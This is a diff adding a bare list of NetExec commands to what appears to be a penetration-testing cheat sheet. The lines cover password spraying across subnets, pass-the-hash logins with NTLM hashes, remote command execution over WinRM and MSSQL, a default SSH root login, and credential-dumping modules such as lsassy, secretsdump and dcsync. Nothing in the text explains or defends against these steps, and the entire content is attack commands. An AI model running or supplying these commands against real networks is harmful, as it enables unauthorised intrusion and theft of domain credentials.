@@ -32,7 +32,37 @@ nmap -iL targets.txt -p445 --script smb* -oA smb_enum
 # 1.1 Netexec
 
 ```bash
+netexec smb 10.10.10.5 -u administrator -p Password123
+netexec smb 10.10.10.0/24 -u admin -p pass
+netexec smb targets.txt -u admin -p pass
+netexec smb 10.10.10.0/24 -u users.txt -p Spring2024!
+netexec smb 10.10.10.25 -u administrator -H aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58
+netexec smb 10.10.10.0/24 -u user -p pass --admin
+netexec smb dc_ip -u user -p pass --users
+netexec smb dc_ip -u user -p pass --groups
+netexec smb 10.10.10.5 -u user -p pass --shares
 
+netexec winrm 10.10.10.25 -u admin -p pass
+netexec winrm 10.10.10.25 -u admin -p pass -x "whoami"
+netexec winrm 10.129.202.136 -u username.list -p password.list
+
+netexec ldap dc_ip -u user -p pass
+netexec ldap dc_ip -u user -p pass --users
+
+netexec mssql 10.10.10.30 -u sa -p Password123
+netexec mssql 10.10.10.30 -u sa -p pass -x "whoami"
+
+netexec ssh 10.10.10.20 -u root -p toor
+
+netexec smb --list-modules
+
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M sam
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M lsassy
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M system
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M security
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M secretsdump
+netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M dcsync
 
 
 
